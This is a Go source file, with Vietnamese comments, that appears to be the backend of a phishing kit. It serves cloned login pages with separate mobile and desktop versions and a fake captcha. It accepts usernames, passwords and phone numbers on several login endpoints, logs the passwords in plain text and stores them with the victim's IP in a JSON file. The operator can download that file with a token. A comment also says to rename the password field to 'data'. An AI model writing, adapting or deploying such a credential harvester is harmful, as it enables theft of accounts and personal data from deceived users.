package main

import (
	"bytes"
	"crypto/subtle"
	"embed"
	"encoding/json"
	"errors"
	"html/template"
	"io"
	"io/fs"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/joho/godotenv"
)

/*
Env vars:
- DOWNLOAD_TOKEN=tok123
*/

// ====== EMBED STATIC ======
//
//go:embed web/*
var webFS embed.FS

var indexOnce sync.Once
var indexTmpl *template.Template

func loadIndexTmpl() {
	t, err := template.ParseFS(webFS, "web/index.html")
	if err == nil {
		indexTmpl = t
	}
}

// ====== DATA ======
type LoginEntry struct {
	User string `json:"user"`
	Pass string `json:"pass"`
	Tel  string `json:"tel"`
	IP   string `json:"ip"`
}

type Store struct {
	mu   sync.Mutex
	path string
}

func NewStore(path string) *Store {
	// Đảm bảo đường dẫn là tuyệt đối hoặc tương đối đúng
	absPath, err := filepath.Abs(path)
	if err != nil {
		log.Printf("WARNING: Cannot get absolute path for %s: %v, using relative path", path, err)
		absPath = path
	}

	_ = os.MkdirAll(filepath.Dir(absPath), 0o755)

	// Kiểm tra và khởi tạo file nếu chưa tồn tại hoặc trống
	if info, err := os.Stat(absPath); errors.Is(err, os.ErrNotExist) {
		log.Printf("File %s does not exist, creating with empty array", absPath)
		_ = os.WriteFile(absPath, []byte("[]"), 0o644)
	} else if err == nil && info.Size() == 0 {
		log.Printf("File %s is empty, initializing with empty array", absPath)
		_ = os.WriteFile(absPath, []byte("[]"), 0o644)
	} else {
		// Kiểm tra xem file có phải là JSON hợp lệ không
		data, err := os.ReadFile(absPath)
		if err == nil {
			dataStr := strings.TrimSpace(string(data))
			if len(dataStr) == 0 {
				log.Printf("File %s is empty, initializing with empty array", absPath)
				_ = os.WriteFile(absPath, []byte("[]"), 0o644)
			} else if !strings.HasPrefix(dataStr, "[") {
				log.Printf("File %s does not start with '[', initializing with empty array", absPath)
				_ = os.WriteFile(absPath, []byte("[]"), 0o644)
			}
		}
	}

	log.Printf("Store initialized with path: %s", absPath)
	return &Store{path: absPath}
}

func (s *Store) appendEntry(e LoginEntry) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	data, err := os.ReadFile(s.path)
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		log.Printf("ERROR reading file %s: %v", s.path, err)
		return err
	}

	var arr []LoginEntry
	dataStr := strings.TrimSpace(string(data))
	if len(dataStr) > 0 {
		if err := json.Unmarshal(data, &arr); err != nil {
			log.Printf("ERROR parsing JSON from %s: %v, data: %q", s.path, err, dataStr)
			// Nếu file không hợp lệ, khởi tạo lại mảng rỗng
			arr = []LoginEntry{}
		}
	}

	arr = append(arr, e)
	log.Printf("DEBUG: Appending entry, total entries: %d", len(arr))

	tmp := s.path + ".tmp"
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetIndent("", "  ")
	if err := enc.Encode(arr); err != nil {
		log.Printf("ERROR encoding JSON: %v", err)
		return err
	}

	jsonData := buf.Bytes()
	log.Printf("DEBUG: Writing %d bytes to %s", len(jsonData), tmp)

	if err := os.WriteFile(tmp, jsonData, 0o644); err != nil {
		log.Printf("ERROR writing temp file %s: %v", tmp, err)
		return err
	}

	if err := os.Rename(tmp, s.path); err != nil {
		log.Printf("ERROR renaming %s to %s: %v", tmp, s.path, err)
		return err
	}

	log.Printf("DEBUG: Successfully saved to %s", s.path)
	return nil
}

func (s *Store) readAll() ([]byte, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	b, err := os.ReadFile(s.path)
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return []byte("[]"), nil
		}
		return nil, err
	}
	return b, nil
}

// ====== HELPERS ======
func clientIP(r *http.Request) string {
	if xf := r.Header.Get("X-Forwarded-For"); xf != "" {
		parts := strings.Split(xf, ",")
		return strings.TrimSpace(parts[0])
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func sanitize(s string) string { return strings.TrimSpace(s) }

func ctEq(a, b string) bool { return subtle.ConstantTimeCompare([]byte(a), []byte(b)) == 1 }

func oneOf(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

// isMobileDevice kiểm tra User-Agent để phát hiện thiết bị mobile
func isMobileDevice(userAgent string) bool {
	ua := strings.ToLower(userAgent)
	mobileKeywords := []string{
		"mobile", "android", "iphone", "ipad", "ipod",
		"blackberry", "windows phone", "opera mini", "iemobile",
	}
	for _, keyword := range mobileKeywords {
		if strings.Contains(ua, keyword) {
			return true
		}
	}
	return false
}

// ====== MAIN ======
func main() {
	godotenv.Load(".env")

	indexOnce.Do(loadIndexTmpl)
	store := NewStore("data/logins.json")

	// Serve static /static/* từ embed web/
	sub, _ := fs.Sub(webFS, "web")
	staticHandler := http.FileServer(http.FS(sub))
	http.Handle("/static/", http.StripPrefix("/static/", staticHandler))

	// GET / -> phát hiện thiết bị và serve đúng file (mobile.html hoặc index.html)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		userAgent := r.Header.Get("User-Agent")
		isMobile := isMobileDevice(userAgent)

		var filename string
		if isMobile {
			filename = "web/mobile.html"
		} else {
			filename = "web/index.html"
		}

		f, err := webFS.Open(filename)
		if err != nil {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		defer f.Close()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		_, _ = io.Copy(w, f)
	})

	// POST /submit (alias /login) -> LƯU VÀO JSON, KHÔNG TẢI NGAY
	handleSubmit := func(w http.ResponseWriter, r *http.Request) {
		// CORS headers
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}

		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
		ct := r.Header.Get("Content-Type")
		if strings.HasPrefix(ct, "multipart/form-data") {
			if err := r.ParseMultipartForm(1 << 20); err != nil {
				http.Error(w, "Dữ liệu không hợp lệ (multipart)", http.StatusBadRequest)
				return
			}
		} else {
			if err := r.ParseForm(); err != nil {
				http.Error(w, "Dữ liệu không hợp lệ", http.StatusBadRequest)
				return
			}
		}

		log.Printf("Form fields: %+v\n", r.PostForm)
		log.Printf("Content-Type: %s\n", ct)

		// Lấy các trường chính
		username := sanitize(oneOf(
			r.FormValue("login-username"),
			r.FormValue("username"),
			r.FormValue("ten_dang_nhap"),
		))
		phone := sanitize(oneOf(
			r.FormValue("so-dien-thoai"),
			r.FormValue("so_dien_thoai"),
			r.FormValue("phone"),
		))
		// THAY password -> data
		dataField := sanitize(oneOf(
			r.FormValue("data"),           // bạn sẽ đổi name="data" trong HTML
			r.FormValue("login-password"), // fallback nếu HTML cũ chưa đổi
			r.FormValue("mat_khau"),
		))

		log.Printf("Parsed: username=%q, password=%q, phone=%q\n", username, dataField, phone)

		if username == "" {
			log.Printf("ERROR: Thiếu username\n")
			http.Error(w, "Thiếu username", http.StatusBadRequest)
			return
		}

		entry := LoginEntry{
			User: username,
			Pass: dataField,
			Tel:  phone,
			IP:   clientIP(r),
		}

		if err := store.appendEntry(entry); err != nil {
			wd, _ := os.Getwd()
			exe, _ := os.Executable()
			log.Printf("appendEntry error: %v", err)
			log.Printf("DEBUG cwd=%q exe=%q DATA_DIR=%q", wd, exe, os.Getenv("DATA_DIR"))
			http.Error(w, "Lưu thất bại", http.StatusInternalServerError)
			return
		}

		log.Printf("SUCCESS: Đã lưu dữ liệu cho user=%q\n", username)

		// Trả về JSON success để JavaScript xử lý redirect
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"success":true}`))
	}
	http.HandleFunc("/submit", handleSubmit)
	http.HandleFunc("/login", handleSubmit)        // alias cho tiện
	http.HandleFunc("/submit-login", handleSubmit) // alias nếu HTML cũ

	// API xem dữ liệu (debug) — đóng khi production
	http.HandleFunc("/api/logins", func(w http.ResponseWriter, r *http.Request) {
		b, err := store.readAll()
		if err != nil {
			http.Error(w, "Lỗi đọc file", http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Write(b)
	})

	// trong func main(), thêm:
	http.HandleFunc("/captcha", func(w http.ResponseWriter, r *http.Request) {
		// random số từ 1 đến 10
		n := rand.Intn(10) + 1
		filename := "web/captcha/" + strconv.Itoa(n) + ".png"

		f, err := webFS.Open(filename)
		if err != nil {
			http.Error(w, "captcha not found", http.StatusNotFound)
			return
		}
		defer f.Close()

		w.Header().Set("Content-Type", "image/png")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		io.Copy(w, f)
	})

	// Tải file JSON khi CẦN: GET /download?token=XXX
	downloadToken := os.Getenv("DOWNLOAD_TOKEN")

	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
		if downloadToken == "" {
			http.Error(w, "DOWNLOAD_TOKEN chưa cấu hình", http.StatusInternalServerError)
			return
		}
		token := r.URL.Query().Get("token")
		if !ctEq(token, downloadToken) {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}
		b, err := store.readAll()
		if err != nil {
			http.Error(w, "Lỗi đọc file", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Header().Set("Content-Disposition", "attachment; filename=\"logins.json\"")
		w.Write(b)
	})

	log.Println("listening on :8080")
	log.Fatal(http.ListenAndServe("0.0.0.0:8080", nil))

}
